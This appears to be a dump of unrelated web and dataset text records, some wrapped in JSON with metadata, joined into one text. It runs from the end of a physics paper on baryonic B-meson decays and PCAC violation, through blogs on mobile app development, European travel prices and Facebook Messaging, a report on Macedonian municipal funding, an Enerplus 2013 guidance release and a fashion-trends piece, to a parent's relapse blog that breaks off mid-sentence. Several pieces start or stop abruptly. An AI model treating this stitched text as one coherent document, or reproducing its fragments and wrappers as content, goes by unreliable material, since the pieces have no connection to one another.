In particular, the experimental values of ${\\cal B}(\\bar B^0_{(s)}\\to p\\bar p)$\nand ${\\cal B}(D_s^+\\to p\\bar n)$ can be reproduced.\nIt is the violation of  PCAC that makes ${\\cal B}(D_s^+\\to p\\bar n)$ to be of order $10^{-3}$,\nwhich was considered as the consequence of the long-distance contribution in Ref.~\\cite{Chen:2008pf}.\nWith $m_{D_s}\\simeq m_p+m_{\\bar n}$, the amplitude of ${\\cal A}_1(D_s^+\\to p\\bar n)$\nfrom Eq. (\\ref{A1A2}) is in fact proportional to $\\bar u(g_A+h_A)v$.\nInstead of  $h_A=-g_A$ from PCAC in Eq.~(\\ref{hAf}) with t=$m_{D_s}^2$,\nour approach with $h_A=-0.7 g_A$ shows that the $30\\%$ broken effect of PCAC suffices\nto reveal  ${\\cal B}(D_s^+\\to p\\bar n)$.\nAs seen from Table~\\ref{timelikeF3},\n$C_{h_A}=C_D+C_F$ for the $p\\bar n$ production with the uncertainties\nfitted in Eq.~(\\ref{para}) has the solutions of $h_A=0$ to $h_A=-g_A$,\nwhich allows ${\\cal B}(D_s^+\\to p\\bar n)=(0-16)\\times 10^{-3}$.\nWith the OZI suppression of $\\langle p\\bar p|(\\bar s s)|0\\rangle=0$,\nwhich eliminates ${\\cal A}_2$, the decay of $\\bar B^0_{s}\\to p\\bar p$\nis the same as that of   $\\bar B^0\\to p\\bar p$ to be the first type.\nIn contrast with $D_s^+\\to p\\bar n$, since  ${\\cal A}_1(\\bar B^0_{(s)}\\to p\\bar p)$\n$\\propto m_B^2[(\\frac{m_p+m_{\\bar p}}{m_{B}})^2 g_A+h_A]\\bar u\\gamma_5 v$\nwith a suppressed $g_A$ contribution at the $m_B$ scale, the decay branching ratios\nare enhanced by $h_A$ with $m_B^2$.\nSimilarly, being of the first type, our predicted results for\n${\\cal B}(\\bar B^0\\to \\Lambda\\bar \\Lambda)$,\n${\\cal B}(B^-\\to n\\bar p)$ and\n${\\cal B}(B^-\\to \\Sigma^- \\bar\\Sigma^0)$\ncan be used to  test the violation of PCAC at the GeV scale.\n\nOn the contrary,\n${\\cal B}(B^-\\to \\Lambda(\\Sigma^0)\\bar p)$\nand ${\\cal B}(\\bar B^0_s\\to \\Lambda\\bar \\Lambda)$ are primarily contributed from ${\\cal A}_2$.\nSimilar to  the theoretical relation between  $B^-\\to p\\bar p \\ell \\bar \\nu$~\\cite{semi}\nand  $B\\to p\\bar p M$, which are associated with\nthe same form factors in the $B$ to $\\bf B\\bar B'$ transition,\nresulting in the first observation of the semileptonic baryonic $B$ decays~\\cite{Tien:2013nga},\nthere are connections between the two-body $B^-\\to \\Lambda(\\Sigma^0)\\bar p$ and $\\bar B^0_s\\to \\Lambda\\bar \\Lambda$\nand three-body $\\bar B^0\\to \\Lambda\\bar p\\pi^+$ and $B\\to \\Lambda\\bar \\Lambda K$ decays\nwith the same form factors via the (pseudo)scalar currents.\nAs a result, without  PCAC, the observations of these two-body modes can serve as the test of the factorization,\nwhich accounts for the short-distance contribution.\nNote that the recent work by fitting $\\bar B^0\\to p\\bar p$\nwith the non-factorizable contributions leads\n${\\cal B}(\\bar B^0_s\\to p\\bar p)$ and ${\\cal B}(\\bar B^0\\to \\Lambda\\bar \\Lambda)$\nto be nearly zero~\\cite{diagramic2}, which are clearly different from our results.\n\nIn sum, we have proposed that, based on the factorization, the annihilation mechanism\ncan be applied to all of the two-body baryonic $B_{(s)}$ and $D_s$ decays,\nwhich indicates that the hypothesis of PCAC is violated at the GeV scale.\nWith the modified timelike baryonic form factors via the axial-vector currents,\nwe are able to explain ${\\cal B}(\\bar B^0_{(s)}\\to p\\bar p)$\nand ${\\cal B}(D_s^+\\to p\\bar n)$\nof order $10^{-8}$ and  $10^{-3}$, respectively.\nFor the decay modes that have the contributions from the (pseudo)scalar currents,\nthey have been predicted as\n${\\cal B}(B^-\\to \\Lambda\\bar p)=(3.5^{+0.7}_{-0.5})\\times 10^{-8}$,\n${\\cal B}(B^-\\to \\Sigma^0 \\bar p)=(5.3^{+3.8}_{-2.7})\\times 10^{-8}$, and\n${\\cal B}(\\bar B^0_s\\to \\Lambda\\bar \\Lambda)=(5.3^{+1.4}_{-1.2})\\times 10^{-8}$,\nwhich can be used to test the annihilation mechanism.\nBesides, the branching ratios of\n$\\bar B^0\\to \\Lambda\\bar \\Lambda$,\n$B^-\\to n\\bar p$, and\n$B^-\\to \\Sigma^- \\bar\\Sigma^0$, predicted to be\n$(0.3,\\,3.2,\\,9.6)\\times 10^{-8}$,\ncan be viewed  as the test of PCAC, which are accessible to the experiments at LHCb.\n\n\\section*{ACKNOWLEDGMENTS}\nWe thank Professor H.Y.

{"text": "Mobile app development has become increasingly important thanks to the rise in the number of mobile devices in the market today. We use mobile applications for a number of varying purposes, right from ordering take out and booking a flight, to banking and reading the news. However, there are a couple of myths that exist when it comes to mobile app development. Sure, they were probably true years ago, but aren't today, due to advanced technology and the modern practices in use. Wondering what these myths are? Let's take a closer look at them.\nHow many features your app is to have.\nWhat platform(s) it is compatible with.\nWhose services you choose to hire, such as a freelance developer or professional mobile app development services.\nThese, however, aren't the only factors\u2014 the list goes on and on. What you need to keep in mind is that you don't have to be a multi-millionaire to engage in mobile app development. If you outsource your mobile app development services to Eastern European countries such as Ukraine, you'll be able to create a mobile app in about US $10,000- US $20,000.\nEven today, some still believe that building a website is better than mobile app development. However, there are statistics that prove the complete opposite. Statista has suggested that by 2019, an additional 67% of the world population is going to be using a mobile device. And these individuals will not access websites through their mobiles\u2014 they'll access mobile apps. That's why, mobile app development is hands-down the better option.\nDefine your requirements. This will help you know what you want.\nNarrow down the places you're going to look. You could look online or take references from your friends.\nList the contenders and check out their portfolios.\nMobile app development is sort of a never-ending process if you want your mobile app to stay ahead of its competition. The mobile app development process comprises a number of stages, or rather, cycles. The development of the first version of your mobile app is the first cycle, while the post-release maintenance and updates are cycles on their own.\nIf you believe this, then you are mistaken. There are a number of benefits that mobile app development brings with it. For instance, brands like Taco Bell and Domino's have seen an increase of 20-60% in their income after engaging in mobile app development.\nWhen it comes to mobile app development, outsourcing is considered to be a bad thing. However, outsourcing does have its benefits. Saving a little of your mobile app development budget is one, and finding better expertise is the another. If you outsource mobile app development services, your project will be delegated to another skilled and insightful team. Outsourcing will basically help your handover the burden of mobile app development to pros who have already dealt with the whole ordeal.\nDetermine what your users' issues are.\nThink of a way to solve them.\nTurn your solution into code.\nReaching for the stars is great, but when it comes to mobile app development, it's best not to have extremely high expectations. What you really need to do is scale properly. This way, you'll have a higher chance of succeeding. You could release your app with just its essential features, so that it'll garner more attention from investors.\nYes, it's important to have a good looking and functional app. However, this makes for only half of your mobile app's success. Marketing is also a crucial aspect of mobile app development. Besides organic downloads, you'll have to concentrate on inorganic downloads, as well. You could try combining different marketing strategies and using a variety of marketing channels to increase your inorganic, and subsequently, your organic downloads. Without marketing, your app won't be as successful as it could've been.\nYou could always go with app builders when engaging in mobile app development, but this won't guarantee an excellent application. Standard, general tools aren't able to solve specific issues of your users. This is why, it's important to hire profession mobile app development services from the right mobile application development company who will code your app and make it as good as it can be.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 51333}

(Thinkstock)\nJust in time to plan your summer vacation, currency exchange rates favorable to Americans \u2014 better than they have been in more than a decade \u2014 are making European travel super attractive.\nNormally, Europe is a notoriously expensive getaway. But with the euro-to-greenback exchange hovering near one to one (\u20ac1 was equal to $1.06 at publication time, compared to $1.30 to $1.47 in recent years), Americans now get an instant discount when spending there.\nAs if you need another reason to want to go to Paris or Rome or Berlin, the cost of visiting many European hotspots has gone down an average of 11 percent since last year, according to TripAdvisor's just-released TripIndex Europe report, with some destinations down as much as 25 percent.\nRelated: Ohrid \u2014 the Secret European Gem You've Never Heard Of\n\"Compared to last summer, Americans can expect to pay about 20 percent less on hotels in Europe when booking on TripAdvisor, and eight percent less on roundtrip airfare,\" said Brooke Ferencsik, director of communications for the company. The average nightly rate for a European hotel booked on TripAdvisor for this summer is $133, compared to $164 in 2014. And roundtrip flights from the U.S. to the European destinations on the index cost $1,448 on average between June and August, compared to $1,579 in summer 2014.\nIstanbul \u2014 a great value. (Thinkstock)\nIstanbul is currently the best value in Europe, according to the TripIndex report. On average it will set you back $1,877 for a week-long vacation (at $97 a night for hotel and $1,197 for airfare), 25 percent less than last year.\nA week away in Stockholm comes in at $2,184, down 23 percent from last year (hotels per night average $156.04 and $1,092.35 for a roundtrip flight).\nTake a trip to Copenhagen, and you'll save 21 percent on the trip (a week is $2,347.36). That's nearly $650 you can put toward dinner at Noma (if you can somehow get a reservation).\nYou can also save in Paris (17 percent less, or $2,729.06 for a weeklong trip) and Barcelona, where a trip is 14 percent lower ($2,393.49).\nEven the costs to hit the most expensive destinations in Europe \u2014 London and Zurich \u2014 are down five percent and nine percent, respectively. Only Moscow has gotten more expensive overall (up eight percent), thanks to airfare, says TripAdvisor, though hotel rooms there are down an average of 43 percent.\nAnd it's just not the big-ticket items that are cheaper overseas: Every meal, every souvenir tourists buy with American dollars is cheaper too. As the L.A. Times put it: An American tourist in Paris \"can buy 25 percent more croissants, cafe au laits or mini Eiffel towers than a year ago with the same dollars.\"\nRelated: Fly from NYC to Paris in Style: New (and Cheap) All Business Class Airline Takes Flight\nWATCH: 5 Tips for Renting a European Vacation Villa (Video)\nLet Yahoo Travel inspire you every day.

{"text": "Facebook Messaging \u2013 The Future of Email?\nHoncho - 16 November 2010 - Digital Content\nAnother 'world dominating' launch from Facebook this week with Facebook Messaging, like email but not, apparently. With the expected hype and media fury surrounding another Facebook concept, Facebook Messaging has been hailed as a serious contender for Google, Yahoo! and Microsoft \u2013 but Mr Zuckerberg is quick to point out, 'Facebook Messaging is not an email killer'. So what is it?\nFacebook Messaging is not an email service. I repeat, it is not an email service. Facebook are very keen to point this out, as they feel this is not the main USP of their concept, but what it is is a social communication tool that allows non Facebook users to converse over the internet with everyone else who is on Facebook. Eventually, all Facebook users will have the option of getting a facebook.com email address, whereby anyone can be contacted, however the 'email' is not in the usual format, doing away with subject lines and CC entries. The 'emails' will be in-keeping with the current Facebook chat and will also be sent in 'real-time'. A default inbox will be socially themed, whereby any messages from your friends, or their friends (and their friends, and their friends\u2026) will be viewed in one central location. Facebook have some nice ideas on security, (always a hot topic with new social network concepts) where you can block messages from people not on your 'trusted' list (All customisable on your security settings). However, Graham Cluley from Sophos states that, \"It will be critical for Facebook to implement more effective filtering mechanisms to prevent fraudsters from manipulating Facebook users into falling victim to new spams, scams and phishing attacks.\" By opting for a facebook.com address it means that all your messages will be logged. 'That's just the same as all other email providers!' I hear you say, but they are not linked to your social profile. Hacking of the Facebook server would be tough, but it's not impossible and if you think about some of the types of conversations had via SMS or Facebook chat, it soon becomes clear why you wouldn't want this information finding its way into the public domain. If you use Facebook at work, (naughty naughty!) then you're certainly going to have to improve the security strength of your password! Malware or spam messaging is still possible, (I am sure some of you have received messages from so-called friends only to discover it's for a product you have never heard of!) and is definitely something Facebook will need to address. The social element, as expected, has been embraced when organising messages from friends, with every conversation had with a person showing in one place. So if throughout the day you have communicated with your friend via email, text message or Facebook Chat, all the messages will appear in one thread under that person's name.\nThere is a smart little video too that will concisely explain the Facebook Messaging concept with simple little drawings and a nice voice over guy, check it out here. According to Mark Zuckerberg (Facebook CEO), 350 million users make use of Facebook messages, sending 4 billion personal messages a day, with the number of messages sent on Facebook outpacing the growth of Facebook itself. So the potential is massive and definitely seems a strong contender to MSN, Hotmail, Yahoo! and more. But is it going to work? Will this really be the 'total' messaging service it's hailed to be?

{"text": "Poor municipalities hinder development outside the capital\nPosted on August 5, 2015 Author Goran LefkovCategories ResearchTags development, municipalities\nThe state is obliged to transfer 1% of GDP, or about 60 million Euros per year to underdeveloped municipalities. The government transfers only 1 million Euros. Rural and border communities have no money and do not even dare to apply for EU funds and the state loses investments of tens and hundreds of millions of Euros\nFailing to comply with the Law on Balanced Regional Development and taking money from the concession of natural resources, the state economically exhausts the municipalities. These conditions revolt citizens from other towns.\nStojan from Kocani is unhappy how the state allocates money.\n\"Everything is built in Skopje. Nothing in the other parts of Macedonia. It seems that once Skopje 2014 has been launched, no penny has been given apart from the capital\", says Stojan.\nHe adds that the current government respects neither laws nor rules. One of these laws is the Law on Balanced Regional Development and general revival of the municipalities.\nLittle money and its peculiar distribution, this is the dilemma that creates confusion for Mladen Protic, head of the Centre for Development of Northeast Planning Region.\nMladen Protic\n\"Since 2009, we, as the least developed region, have received 1 million Euros from the government and we have obtained around 1 million Euros from the European funds. Can you develop a region with 2 million Euros? What could be built with 2 million Euros, neither a lane, let alone a major infrastructure facility\", says Protic.\nHe adds that it is good that with this money they have made significant technical documentation applying to donors for implementation of some projects.\nMomcilo Aleksovski, mayor of Rankovce from SDSM, is also dissatisfied with the distribution of money.\nMomcilo Aleksovski\n\"5 municipalities in the region have been given money by the Bureau for Regional Development, but no money has been given to the municipality Rankovci, although this northeastern region, where Rankovci is part from, is least developed\", says Aleksovski. He did not want to comment whether there is politics in distribution of the money from the Bureau for balanced development.\nArian Ibrahim, mayor of Centar Zupa is braver with his statements.\nArian Ibrahim\n\"It is ridiculous that I have not received a penny from the funds for balanced regional development. Through the Bureau for balanced regional development a street is built in the middle of Tetovo and Gostivar and this shows how we respect the laws. I have had projects for linking specific villages on higher altitude so that children can have access to the rest of civilization, and eventually you will see that Struga has received money for reconstruction of the quay of the river Drim, and for us there is no money\", says Ibraim.\nHe adds that the money from this institution is distributed according to political, not according to the criteria prescribed.\nEuropean money waiting for Macedonian projects, but municipalities have no money to pay the fee\nMunicipalities of Eastern, Central and Southern Macedonia have a chance to adopt projects of tens and hundreds of millions of Euros, says Stojce Sardzhiski, economic analyst and former president of the Executive Council (function of current mayor) of Stip.\n\"It is very good to use European funds. They offer a huge potential for development of border communities. It is a pity that municipalities do not have money to implement these projects\", says Samardziski.\nHe adds that municipalities should build their own strategies for development in the coming years and to know what they will fund in the future.\nMayor of Rankovce, Momcilo Aleksovski, also confirms that finances are a problem.\n\"European projects are risky. First we have to pay for the construction of a project, later to wait for the money to be returned. If we do not have money to pay for the construction of a project, the total amount is on us as a municipality without having been transferred money from EU funds for cross-border cooperation\", says Aleksovski.\nHe adds that his predecessor missed a procedure to purchase a vehicle and the money from the European funds had not been paid so they had to pay out from their own account.\nGoran Angelov, former president of ZELS and mayor of Vinica also refers to this issue.\nGoran Angelov\n\"We have a huge potential in small municipalities that can adopt lots of European money. If the municipalities of Eastern, Central and Southern Macedonia have money, they can do wonders with European funds for cross-border cooperation. There are opportunities to pay 10% of the project value, and the remaining 90% to be covered by the EU\", says Angelov.\nThis year for the first time the state has allowed local governments to charge money from the concession on agricultural land.\n\"One of the great successes of ZELS is that we have finally won 10% of the value of concessions on the lease of agricultural land to remain in the municipalities. By 2017 this percentage should reach 50%\", says Dusanka Perisic, Executive Director of ZELS.\nShe adds that in 2016 50% of the concession to use the water to produce electricity should remain in the municipalities. In the future we will require a percentage of concessions for use of forests and pastures, because they all use the roads and infrastructure of municipalities, says Perisic.\nA condition for receiving this money is in the previous year the municipalities to have collection of the property tax of 80%.\nEstablishment of the municipal bank hindered\nMunicipal bank should be an institution that will finance projects of local governments. After building the project, the municipality will require money from European funds for that project, and when it receives the funds, it will return the money to this bank.\nThis institution is more than necessary for the development of Macedonian municipalities.\nZoran Minov, mayor of municipality Karbinci, in this bank sees a strong incentive for the development of municipalities.\nZoran Minov\n\"There is such a bank in Bulgaria. Our partners for CBC have strong support from their bank and they are focused on projects while finances are provided by this bank\", says Minov.\nDusica Perisic from ZELS says they want such an institution to be established in Macedonia.\n\"We have a study on the formation of a municipal bank for funding only local governments, but the idea has not been approved by the Board of the Association. For such a bank we have been waiting for approval for more than a year. Opening Municipal Bank has entered our new strategy and in November it will be considered by the General Assembly of ZELS\", says Perisic.\n(The story was is supported within the NED project \"Raising Awareness about Corruption through Investigative Reporting\")\nPrevious Previous post: \u041cunicipalities operate only for administration's salaries, not for the citizens\nNext Next post: Macedonia becomes Balkan Las Vegas: low standards and too much gambling\nXhelal Neziri is experienced investigative reporter and analyst.

Readers are advised to review the \"Cautionary Note Regarding Forward-Looking Information and Statements\" at the conclusion of this news release. For information regarding the presentation of certain information in this news release, see \"Currency, BOE and Operational Information\" at the conclusion of this news release.\nCALGARY, Dec. 10, 2012 /CNW/ - Enerplus Corporation (\"Enerplus\") (TSX: ERF) (NYSE: ERF) announces guidance for 2013 and the acquisition of additional low decline, light oil interests in Montana.\nAcquisition of Bakken Interests in Montana\nConsistent with our strategy of consolidating core positions within our portfolio, Enerplus has agreed to enter into an agreement to acquire an additional 20% working interest in our operated leases in the Sleeping Giant area in the Elm Coulee field in Richland County, Montana for approximately US$131 million (approximately US$121 million after estimated closing adjustments of US$10 million). By investing approximately half of the proceeds from the sale of our Manitoba assets, we expect to replace the sold production, improve the concentration of our asset base and improve our operating metrics.\nThe acquisition is complementary to our existing operations in Sleeping Giant where we currently own an operated 70% working interest. This is a mature light oil property with an average decline rate of 14%. Our internal reserves assessment has identified a total of 6.2 million BOE of proved plus probable reserves associated with the acquisition and daily production of approximately 1,550 BOE/day (both of which are weighted 80% to light crude oil). The transaction has attractive acquisition metrics of 4.2 times annual funds flow after estimated closing adjustments, $23.00/BOE of proved plus probable reserves including future development capital and is expected to be 4% accretive to funds flow in 2013 (2% on a debt-adjusted basis). This light oil property has current netbacks of approximately $50/BOE with low operating costs averaging $5.50/BOE in 2012. We do not expect any increases in general and administrative costs as a result of the acquisition.\nWe believe there is additional upside potential in this field through production optimization, refracs and limited infill drilling. With approximately 400 million barrels of original oil in place on our operated leases, we are also evaluating the potential for enhanced oil recovery schemes as the current reserve bookings results in a 14% recovery factor. The total crude oil recovered to date is approximately 8%. We anticipate closing the acquisition mid-December, after which Enerplus will own a 90% working interest in the operated leases with production of approximately 7,300 BOE/day. We expect a modest level of capital spending at Sleeping Giant in 2013.\nGuidance for 2013\nIn addition, the Board of Directors of Enerplus has approved a capital spending program for 2013. Highlights of the program are as follows:\nWe expect to deliver funds flow growth of over 11% in 2013. On a debt-adjusted basis, funds flow is expected to grow by 6% per share. This growth, along with a current yield of approximately 8%, aligns with our long-term business strategy of providing an attractive total return to investors comprised of both growth and income.\nWe are targeting a capital program of $685 million, 20% lower than our estimated spending in 2012, which more closely balances our capital spending and dividends with funds flow.\nWe expect production to average between 82,000 BOE/day and 85,000 BOE/day, which at the mid-point of the range, would represent a 2% increase over our estimated 2012 average daily production after adjusting for our recent acquisition and divestment activities. Based upon current cost structures and the commodity price outlook for both crude oil and natural gas in 2013, we believe this is an appropriate level of production growth. We plan to continue to pursue acquisition opportunities in core areas and rationalize non-core assets to enhance our portfolio and profitability.\nWith an expected increase in funds flow, combined with a reduced capital spending program and maintenance of our dividend, we expect our adjusted pay-out ratio to improve to approximately 130% net of our Stock Dividend Program (\"SDP\"). We intend to continue to focus our portfolio and improve our cost structure to enhance the sustainability of our business.\nWe have successfully managed our balance sheet throughout 2012. We continue to pursue joint venture opportunities and non-core asset sales in an effort to allow us to enhance shareholder value. Our debt to funds flow ratio is expected to be 1.9 times at the end of 2013 based upon current forward market commodity prices, our estimate of production and costs and before any additional acquisition or divestment activities\nWe remain committed to providing a meaningful dividend to investors. Given the steps we have proactively taken to improve the sustainability of our business including the sale of non-core assets and reducing our capital spending plans, we currently have no plans to adjust our monthly dividend. We will continue to review dividend levels in the context of commodity prices, capital spending, cost structures and debt levels.\nSummary Guidance*\n2012E 2013E\nCapital Expenditures ($millions) $850 $685\nAnnual Average Daily Production (BOE/day) 82,000 82,000 - 85,000\nOil & Liquids Weighting 49% 50%\nExit Production (BOE/day) 85,000 - 88,000 84,000 - 88,000\nAdjusted Payout Ratio** 190% 130%\nDebt/Funds Flow at Year-End 1.8x 1.9x\n*Assumptions:\nBased upon forward commodity prices and forecast costs as of November 26, 2012 including the impact of hedging and does not include any acquisition or divestment activities not previously announced. Based upon our current capital spending plans for Q42012, forecast YE2012 debt is approximately $1.1 billion\n** Adjusted payout ratio is calculated as the sum of dividends paid to shareholders, net of participation in the Stock Dividend Plan, plus capital expenditures divided by funds flow. See \"Non-GAAP Measures\" below.\nCapital Spending\nWe are targeting a capital spending program of $685 million in 2013. Through this spending, we expect to offset our corporate production decline rate of approximately 24% and grow production modestly by 2%. Approximately 85% of our program is currently planned to be directed to oil and liquids rich natural gas projects, with over 75% directed specifically to crude oil projects. Our capital program is based upon delivering a minimum internal rate of return of 25%.\nThe Fort Berthold region of North Dakota has delivered significant light oil production growth for Enerplus over the past two years. Through our 2012 drilling program, we have effectively managed our lease expirations in the region and grown production to approximately 14,000 BOE/day during the month of November. We expect to reduce capital spending by 25% to approximately $340 million next year as we focus on improving our costs and efficiencies while still delivering production growth. We're forecasting average daily production growth of 30% next year over expected 2012 average volumes. We plan to run a two-rig program targeting both the Bakken and Three Forks formations and expect to drill, complete and bring on-stream between 20 to 25 net wells at Fort Berthold next year. The majority of these wells will be long horizontal wells. We expect non-operating spending will represent approximately 15% of our total spending in this area in 2013.\nWe expect to continue to invest in our oil waterflood properties in Canada next year targeting a capital spending program of approximately $160 million similar to 2012 levels. Under our planned spending, we will continue to invest in drilling projects at Freda Lake in Saskatchewan and Medicine Hat, Giltedge and Pembina in Alberta. Waterflood optimization will remain a focus area as we continue to balance drilling activity with our pressure maintenance programs to effectively manage performance from these fields. Our volumes are expected to be modestly impacted next year as we plan to curtail approximately 400 BOE/day and 2 MMcf/day of natural gas at Pembina early in the first quarter as part of this on-going program. We anticipate that these volumes will be recovered over the course of the next 6 to18 months and believe this will result in better long-term recoveries. Finally, we plan to continue to advance on our existing polymer projects at Medicine Hat and Giltedge. Overall we have been encouraged by the performance of these projects. We plan to evaluate performance over the course of next year and if performance continues as we expect, would be in a position to consider expansion of the program.\nWe plan to reduce capital spending in the Marcellus region by over 50% to $80 million in 2013 directed to non-operated drilling projects in the northeast region of Pennsylvania. Through this drilling program, we expect to have retained the majority of what we believe to be core non-operated acreage by the end of 2013. We expect continued production growth from 55 MMcf/day currently to roughly 75 MMcf/day as we exit 2013. Given the lower operating costs associated with this production ($0.75/Mcf) and NYMEX based pricing, operating netbacks are currently averaging approximately $2.00/Mcf. As a result, our Marcellus production is expected to contribute to the increase in funds flow in 2013. We anticipate that 25% of our corporate natural gas production volumes will be attributable to the Marcellus in 2013. We continue to see positive results from our drilling program despite the delays associated with infrastructure in the region.\nWe expect to continue investing in the Deep Basin region in 2013 on both our operated and non-operated leases. Approximately $75 million will be allocated to develop natural gas projects with associated liquids. Based upon our success in the Wilrich play in Alberta in 2012, we are planning an additional 3 to 5 wells next year.\nApproximately 75% of our capital spending is expected to be directed to drilling projects with around 90 net wells planned in 2013 with 80 net wells brought on-stream throughout the year. The program is weighted to the first half of the year with about one third of the capital planned for investment in the first quarter. We expect that approximately 75% of our capital spending will be directed to properties where we control the pace and level of spending. We expect to allocate less than $30 million to delineate our undeveloped acreage in 2013.\n2013 Capital Spending Breakdown 2013E\n($ millions)\nDevelopment Drilling & Completions $555\nPlant/Facilities $70\nMaintenance $30\nExploration & Seismic $30\nWe expect to review our capital spending program on a regular basis throughout the year in the context of prevailing commodity prices, economic conditions and cost structures and may modify our spending plans as required.\nProduction Growth\nWe are forecasting average daily production of 82,000 to 85,000 BOE/day in 2013, a 2% increase over our estimated 2012 average daily production after adjusting for our recent acquisition and divestment activities. Crude oil production is expected to increase in 2013, averaging 38,000 bbls/day, up 2.5% from 2012. Oil production in the Fort Berthold region of North Dakota is expected to grow again in 2013 but at a slower pace than in 2012 given the reduced capital spending plans. Natural gas and natural gas liquids volumes are expected to remain flat year-over-year. The additional natural gas volumes associated with our 2012 Marcellus drilling program are anticipated to come on-stream during the first half of 2013 and are expected to offset the decline in our Canadian conventional natural gas properties. Total natural gas production is expected to average approximately 250 MMcf/day. Approximately 75% of our total production will be operated by Enerplus.\nAs we plan to spend a greater proportion of our capital spending in the first half of 2013, and given the variability and timing of our non-operated spending, we expect exit production in 2013 to range between 84,000 and 88,000 BOE/day.\nCurrent Daily Production\nDaily production during the month of November 2012 is estimated to be 86,000 BOE/day. Given the slow-down in drilling activity, we expect December production will be similar.\nOperating costs are expected to average $10.70/BOE, unchanged from 2012 and general and administrative expenses are expected to average $3.40/BOE, up marginally from 2012. We expect our average royalty rate will increase slightly in 2013 due to an improvement in the natural gas price outlook and the increase in production associated with our U.S. operations which have higher royalty rates than our Canadian operations. Royalties are expected to average 21% of revenues. We have sufficient tax pools to shelter our funds flow in Canada in 2013 and beyond, and we expect U.S. cash taxes to be approximately 3% of our U.S. cash flow.\n2013 Forecast Expenses 2013E\nOperating Costs ($/BOE) $10.70\nCash General & Administrative Expenses ($/BOE) $3.15\nNon-cash General & Administrative Expenses ($/BOE) $0.25\nRoyalties 21%\nCash Taxes ($MM) $12\nInterest Expense ($MM) $65\nFunds Flow Growth\nBased upon current forward commodity prices, we expect funds flow to grow in 2013 by 6% per debt-adjusted share. Improvements in natural gas prices as well as the growing NYMEX based natural gas production in the Marcellus are key factors contributing to this expected growth. Our hedging program is expected to provide support to this increase as we have 57% of our anticipated net oil production volumes hedged at a price of US$100.84 per barrel and 12% of our projected net natural gas volumes swapped at a fixed price of $3.63/Mcf and a further 11% of our projected net natural gas production hedged with put protection at $3.17/Mcf. We estimate that approximately 75% of the net operating income will be generated from our oil plays.\n2013 Sensitivities Est. effect on 2013\nFunds Flow/Share\nChange of $5.00/bbl WTI crude oil $0.14\nChange of $0.50/Mcf AECO natural gas $0.18\nChange of 1,000 BOE/day production $0.05\nChange of $0.01 in the US$/CDN$ exchange rate $0.05\nWe have preserved our financial flexibility throughout 2012 through the sale of non-core assets, issuance of long-term debt and a reduction in our dividend. We expect to exit 2012 with a debt-to-funds flow ratio of 1.8 times which we anticipate is at the low end of our peer group. Our adjusted pay-out ratio is expected to drop significantly in 2013 to approximately 130% net of the participation in the SDP. In the context of current commodity prices, we expect a debt-funded shortfall of $200 million (funds flow including participation in the SDP less capital spending and dividends). We expect to continue to divest of non-core assets to offset our funding shortfall and to improve the concentration and focus within our portfolio. Our debt to funds flow ratio is expected to be 1.9 times at the end of 2013 before consideration of any joint venture, asset sale or acquisition activities.\nGordon J. Kerr\nEnerplus Corporation\nCurrency, BOE and Operational Information\nAll dollar amounts or references to \"$\" in this news release are in Canadian dollars unless specified otherwise. Enerplus has adopted the standard of 6 Mcf:1 BOE when converting natural gas to BOEs. BOEs may be misleading particularly if used in isolation. A BOE conversion ratio of 6 Mcf:1 BOE is based on an energy equivalency conversion method primarily applicable at the burner tip and does not represent a value equivalency at the wellhead. Given that the value ratio based on the current price of crude oil as compared to natural gas is significantly different from the energy equivalency of 6:1, utilizing a conversion on a 6:1 basis may be misleading as an indication of value. Unless otherwise stated, all oil and gas production information and estimates are presented on a gross basis, before deducting royalty interests.\nCautionary Note Regarding Forward-Looking Information and Statements\nThis news release contains certain forward-looking information and statements (collectively, \"forward-looking information\") within the meaning of applicable securities laws.

The local fashion stores in Menifee, such as Forever 21, Tillys, and Ulta are making sure we're keeping up with the latest and hottest trends in fashion for this season. These trends don't just apply to teens, but for all women and men in every age group, as well as every body type.\nSpring and Summer is all about patterns and bright colors. According to Lauren Taylor, a Forever 21 Sales Associate, \"stripes, polka dots, and floral patterns are the way to go. Bright colors such as green, yellow, white, and orange is what's trending now\".\nFor the women dresses, shorts, halter tops, and bathing suits is going to enhance that \"cute\" look every woman desires to have, especially when they've most likely been working out all fall and winter in order to get that perfect body to wear shorts and halter tops.\nFor the men, it's all about the \"frat boy look\" as Lauren calls it. The frat boy look requires shorts with a hoodie, and a collared shirt over it. If they aren't into the frat boy look, no worries because a simple logo tee with a bright color, and a pair of shorts or swimming trunks will work just fine.\nForever 21 is not the only store who says that stripes, polka dots, and floral prints is what's trending for this season. Tillys another fast selling store with the hottest fashion in Menifee agrees with that statement. Dianna Anderson, one of the Managers for Tillys mentions that \"camo, fruit pattern, animals pattern, and boho\", is also trending.\nFor the women, any two piece set or off the shoulder shirt will compliment them well during these warm seasons. Dianna also mentions that \"yellow, blue, and a russ red are the trending colors\", especially when boho in style.\nFor the men, \"boy shorts and tank tops are selling like no other\", says Dianna. Also graphic tees, collared shirts with fruit patterns (pineapples and watermelon), and swim trunks with bright colors to go along with animal patterns (blue, pink, flamingo, and rubber duckies) is what's trending around town.\nMatte lips are out, and glitter glosses are in. Mac has released new dazzle lip glosses and they are the movement for the season. Any coral, clear, gold, or essential bright bold color is the one we should chose.

{"text": "It's been a long, long week*. A week ago Friday, our son left and we didn't hear from him until he walked back in the house the following Friday morning.\nHe was cold and his hands were shaking as he held out his car keys and wallet, asking, \"Would you hold onto these for awhile?\".\nThis was followed by hugs and a brief conversation. Then he took a warm shower, made himself a peanut butter and jelly sandwich, took the dog for a walk, and settled in for a long nap followed by another walk with the dog.\nHere's hoping this week brings clarity and positive steps forward.\n*Read The Third R blog post for details.\nAn update from Midwestern Mama on #SoberSon and his recent Return to Use aka Relapse.\nOrdinarily when I think R & R, it conjures up the concept of rest and relaxation. However, when it comes to addiction and mental health, the R words that I think of are Relapse and Recovery. Oh, and there's one more: Ready.\n2017 has been a struggle for my son. He's maintained sobriety from opiate use, but began using cannabis and drinking alcohol again. He thinks of it as self medicating, yet his mental health is suffering, not improving.\nIt came to a head this summer. To top it off, he decided to stop taking Suboxone \u2013 almost cold turkey instead of a slow taper with support from his treatment team. The effect is terrible. He's irritable and agitated. The cravings are strong. Anxiety and depression are ever present and getting worse.\nLast week he admitted that things aren't working and that he hadn't anticipated the impact of going off Suboxone. To his credit, he made an appointment with a mental-health professional and decided to go on an anti-depressant. Of course, they counseled him about the risks of using marijuana and alcohol while taking the medication.\nNo more than a few days into the new approach, he left one morning and didn't come home later in the day to get ready for work. He didn't go to work that evening. He didn't come home that night. He 